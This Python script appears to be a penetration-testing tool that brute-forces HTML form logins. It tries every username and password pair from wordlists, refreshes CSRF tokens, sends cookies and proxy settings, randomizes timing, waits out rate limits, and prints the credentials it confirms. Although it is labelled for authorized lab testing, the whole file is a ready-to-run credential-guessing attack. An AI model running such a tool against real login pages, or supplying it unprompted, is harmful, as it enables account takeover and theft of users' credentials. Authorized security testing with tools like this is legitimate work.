#!/usr/bin/env python3
"""HTML form login credential tester for authorized lab testing.

POSTs (or GETs) username/password pairs to a login endpoint and reports which
pairs authenticate. Unlike http_login_brute.py — which targets JSON login
APIs — this one handles traditional HTML forms: CSRF tokens, extra static
fields (`--extra-field`), a session cookie (`--cookie`), and response
classification by substring (`--success-text`/`--fail-text`) or by a
fingerprint of the unauthenticated page when no marker text is given.

Output contract (kept consistent with the other tools/ scripts so the same
parsers apply):
  * `[+] <user>:<password>`   for each confirmed login
  * `[*] attempts=N confirmed=N failures=N errors=N rate_limited=N`
    summary line (errors = transient HTTP 5xx/request failures)

Usage:
    python web_login_brute.py --url URL --usernames FILE --passwords FILE [options]
"""
import argparse
import random
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests


class WebLoginBruteForcer:
    def __init__(self, url, method="POST", user_field="username", pass_field="password",
                 success_text=None, fail_text=None, block_text=None, mfa_text=None,
                 delay=1.0, threads=1, timeout=10.0, retries=3, cooldown=30.0,
                 csrf_field=None, csrf_url=None, proxy=None, user_agent=None,
                 extra_fields=None, cookie=None):
        self.url = url
        self.method = method
        self.user_field = user_field
        self.pass_field = pass_field
        self.success_text = success_text
        self.fail_text = fail_text
        self.block_text = block_text
        self.mfa_text = mfa_text
        self.delay = delay
        self.threads = threads
        self.timeout = timeout
        self.retries = retries
        self.cooldown = cooldown
        self.csrf_field = csrf_field
        self.csrf_url = csrf_url or url
        self.proxy = proxy
        self.headers = {"User-Agent": user_agent} if user_agent else {}
        self.extra_fields = extra_fields or []      # list of (key, value)
        self.cookie = cookie
        if cookie:
            self.headers["Cookie"] = cookie
        self.baseline = None
        self.lock = threading.Lock()
        self.counters = {"attempts": 0, "confirmed": 0, "failures": 0,
                         "rate_limited": 0, "server_errors": 0}
        self.warned_csrf_missing = False

    def read_wordlist(self, path):
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return [line.strip() for line in f if line.strip()]

    def request(self, method, url, session=None, **kw):
        kw.setdefault("timeout", self.timeout)
        kw.setdefault("headers", self.headers)
        if self.proxy:
            kw["proxies"] = {"http": self.proxy, "https": self.proxy}
        if session is not None:
            return session.request(method, url, **kw)
        return requests.request(method, url, **kw)

    def send(self, method, url, data=None, session=None):
        # GET logins put parameters in the query string; POST/PUT in the body.
        if method.upper() == "GET" and data:
            return self.request(method, url, session=session, params=data)
        return self.request(method, url, session=session, data=data)

    def setup_attempt(self):
        """Fresh session + (fresh CSRF token if configured). Isolated per attempt."""
        sess = requests.Session()
        if not self.csrf_field:
            return sess, None
        try:
            form_page = self.request("GET", self.csrf_url, session=sess)
        except requests.RequestException:
            self._warn_csrf()
            return sess, None
        token = self._extract_csrf(form_page.text)
        if token is None:
            self._warn_csrf()
        return sess, token

    def _warn_csrf(self):
        if not self.warned_csrf_missing:
            print(f"[!] Could not find CSRF token in {self.csrf_url}; proceeding without it")
            self.warned_csrf_missing = True

    def _extract_csrf(self, html):
        """Tolerate name-before-value and value-before-name attribute order."""
        pats = (
            rf'<input[^>]*name=["\']{re.escape(self.csrf_field)}["\'][^>]*value=["\']([^"\']*)["\']',
            rf'<input[^>]*value=["\']([^"\']*)["\'][^>]*name=["\']{re.escape(self.csrf_field)}["\']',
        )
        for pat in pats:
            m = re.search(pat, html)
            if m:
                return m.group(1)
        return None

    def _login_data(self, username, password, token):
        data = {self.user_field: username, self.pass_field: password}
        if token is not None:
            data[self.csrf_field] = token
        for key, value in self.extra_fields:
            data[key] = value
        return data

    def fingerprint_login_page(self):
        sess, token = self.setup_attempt()
        try:
            resp = self.send(self.method, self.url,
                             data=self._login_data("__no_such_user__", "__no_such_pass__", token),
                             session=sess)
        except requests.RequestException:
            resp = self.request("GET", self.url)
        self.baseline = (resp.status_code, len(resp.content))

    def classify(self, resp):
        status = resp.status_code
        content = resp.text

        if status == 429:
            return "rate_limited"
        if status == 403 and self.block_text and self.block_text in content:
            return "blocked"
        if status >= 500:
            return "server_error"
        if self.mfa_text and self.mfa_text in content:
            return "mfa_required"
        if self.success_text:
            return "success" if self.success_text in content else "failure"
        if self.fail_text:
            return "failure" if self.fail_text in content else "success"
        with self.lock:
            baseline = self.baseline
        if baseline is None:
            return "failure"
        return "success" if (status, len(content)) != baseline else "failure"

    def _count(self, key):
        with self.lock:
            self.counters[key] += 1

    def _backoff(self, n):
        time.sleep(min(0.5 * 2 ** n, 16))

    def attempt(self, username, password):
        """Return (status, user, pass) for a confirmed success/mfa, else None."""
        sess, token = self.setup_attempt()
        for n in range(1 + self.retries):
            try:
                resp = self.send(self.method, self.url,
                                 data=self._login_data(username, password, token),
                                 session=sess)
            except requests.RequestException:
                if n == self.retries:
                    return None
                self._backoff(n)
                continue

            result = self.classify(resp)
            self._count("attempts")

            if result == "rate_limited":
                self._count("rate_limited")
                time.sleep(self.cooldown)
                continue
            if result == "server_error":
                self._count("server_errors")
                if n < self.retries:
                    self._backoff(n)
                    continue
                return None
            if result in ("blocked", "failure"):
                self._count("failures")
                return None

            # success / mfa_required: confirm with a fresh, independent request.
            sess2, token2 = self.setup_attempt()
            try:
                confirmed = self.classify(self.send(self.method, self.url,
                                                    data=self._login_data(username, password, token2),
                                                    session=sess2))
            except requests.RequestException:
                confirmed = None

            if confirmed == result:
                self._count("confirmed")
                return result, username, password
            return None
        return None

    def brute_force(self, usernames, passwords):
        found = []
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {pool.submit(self.attempt, u, p): (u, p)
                       for u in usernames for p in passwords}
            for future in as_completed(futures):
                if self.delay:
                    time.sleep(self.delay * random.uniform(0.5, 1.5))
                result = future.result()
                if result:
                    status, u, p = result
                    found.append((u, p, status))
                    print(f"[+] {u}:{p}")
        return found

    def run(self, usernames_file, passwords_file, dry_run=False):
        self.fingerprint_login_page()
        with self.lock:
            b = self.baseline
            print(f"[*] Baseline fingerprint: status={b[0]} len={b[1]}")
        if dry_run:
            return
        found = self.brute_force(self.read_wordlist(usernames_file),
                                 self.read_wordlist(passwords_file))
        with self.lock:
            c = self.counters
            print(f"[*] attempts={c['attempts']} confirmed={c['confirmed']} "
                  f"failures={c['failures']} errors={c['server_errors']} "
                  f"rate_limited={c['rate_limited']}")
        print("Found credentials:" if found else "No successful logins found.")
        for u, p, status in found:
            print(f"  [{status}] {u}:{p}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="HTML form login credential tester (authorized testing only)")
    parser.add_argument("--url", required=True)
    parser.add_argument("--method", default="POST", choices=["GET", "POST"])
    parser.add_argument("--user-field", default="username")
    parser.add_argument("--pass-field", default="password")
    parser.add_argument("--success-text", help="Substring present on success")
    parser.add_argument("--fail-text", help="Substring present on failure")
    parser.add_argument("--block-text", help="Substring that indicates a block")
    parser.add_argument("--mfa-text", help="Substring that indicates MFA required")
    parser.add_argument("--delay", type=float, default=1.0)
    parser.add_argument("--threads", type=int, default=1)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--retries", type=int, default=3)
    parser.add_argument("--cooldown", type=float, default=30.0)
    parser.add_argument("--csrf-field")
    parser.add_argument("--csrf-url")
    parser.add_argument("--extra-field", action="append", default=None,
                        metavar="KEY=VALUE",
                        help="Extra static form field to send on every attempt (repeatable)")
    parser.add_argument("--cookie", help="Cookie header to send on every request, e.g. PHPSESSID=abc")
    parser.add_argument("--proxy")
    parser.add_argument("--user-agent")
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--usernames", required=True)
    parser.add_argument("--passwords", required=True)

    a = parser.parse_args()
    extra_fields = []
    for f in (a.extra_field or []):
        if "=" in f:
            extra_fields.append(tuple(f.split("=", 1)))
    WebLoginBruteForcer(
        url=a.url, method=a.method, user_field=a.user_field,
        pass_field=a.pass_field, success_text=a.success_text,
        fail_text=a.fail_text, block_text=a.block_text,
        mfa_text=a.mfa_text, delay=a.delay, threads=a.threads,
        timeout=a.timeout, retries=a.retries, cooldown=a.cooldown,
        csrf_field=a.csrf_field, csrf_url=a.csrf_url, proxy=a.proxy,
        user_agent=a.user_agent, extra_fields=extra_fields,
        cookie=a.cookie,
    ).run(a.usernames, a.passwords, dry_run=a.dry_run)
